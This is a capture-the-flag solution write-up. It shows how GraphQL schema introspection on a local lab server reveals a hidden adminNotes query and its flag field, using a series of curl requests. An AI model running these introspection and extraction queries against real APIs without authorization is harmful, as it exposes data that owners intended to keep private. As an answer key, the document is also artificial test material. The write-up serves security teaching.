# Solution: Schema Introspection

## Overview

This challenge demonstrates how GraphQL schema introspection can expose hidden fields and types that developers intended to keep private.

## Step 1: Reconnaissance

Start by exploring the publicly documented queries:

```bash
curl -X POST http://localhost:8002/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username email } }"
  }'
```

This returns basic user information. Now check what else might be available.

## Step 2: Vulnerability Identification

Use introspection to discover all available queries:

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      fields {
        name
        type {
          name
          ofType {
            name
          }
        }
      }
    }
  }
}
```

Using curl:

```bash
curl -X POST http://localhost:8002/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { queryType { fields { name type { name ofType { name } } } } } }"
  }'
```

The response reveals a hidden `adminNotes` field that returns `SecretNote` objects - this wasn't in the public documentation!

## Step 3: Exploitation

Explore the `SecretNote` type structure:

```bash
curl -X POST http://localhost:8002/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __type(name: \"SecretNote\") { fields { name type { name } } } }"
  }'
```

This reveals the `SecretNote` type has fields including `id`, `title`, `content`, and importantly, `flag`.

## Step 4: Flag Retrieval

Query the hidden `adminNotes` field with all available fields:

```bash
curl -X POST http://localhost:8002/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { adminNotes { id title content flag } }"
  }'
```

The response contains the flag in the `flag` field of the returned SecretNote object.

The flag follows the format: `HC{...}`
